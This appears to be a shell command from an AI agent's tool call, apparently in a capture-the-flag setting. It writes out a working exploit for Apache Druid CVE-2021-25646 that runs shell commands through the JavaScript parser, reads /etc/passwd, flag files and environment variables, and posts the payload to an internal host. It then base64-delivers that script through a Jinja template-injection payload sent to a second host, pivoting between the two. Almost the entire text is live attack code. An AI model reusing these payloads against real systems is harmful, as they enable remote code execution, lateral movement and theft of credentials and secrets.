cat > /tmp/druid_exploit.py << 'PYEOF'
import json
import urllib.request

# Druid runs on 172.30.10.3:8888
TARGET = "http://172.30.10.3:8888/druid/indexer/v1/sampler"

CMD = "ls -la / && cat /flag* 2>/dev/null && cat /tmp/flag* 2>/dev/null && env"

payload = {
    "type": "index",
    "spec": {
        "ioConfig": {
            "type": "index",
            "firehose": {
                "type": "local",
                "baseDir": "/etc",
                "filter": "passwd"
            }
        },
        "dataSchema": {
            "dataSource": "test",
            "parser": {
                "parseSpec": {
                    "format": "javascript",
                    "timestampSpec": {},
                    "dimensionsSpec": {},
                    "function": 'function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["sh","-c","' + CMD.replace('"','\\"') + '"]).getInputStream()).useDelimiter("\\\\A").next();return {timestamp:123123,test: a}}',
                    "": {"enabled": "true"}
                }
            }
        }
    },
    "samplerConfig": {"numRows": 10}
}

data = json.dumps(payload).encode()
req = urllib.request.Request(TARGET, data=data, headers={"Content-Type":"application/json"})
try:
    r = urllib.request.urlopen(req, timeout=15)
    print(r.read().decode())
except Exception as e:
    print("ERR:", e)
    if hasattr(e, 'read'):
        print(e.read().decode())
PYEOF

B64=$(base64 -w0 /tmp/druid_exploit.py)
payload="{{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"echo $B64 | base64 -d > /tmp/dr.py && python3 /tmp/dr.py\").read() }}"
curl -s --data-urlencode "username=$payload" -G "http://10.254.8.128:32774/" 2>&1 | head -100', 'description': 'Druid CVE-2021-25646 RCE'})

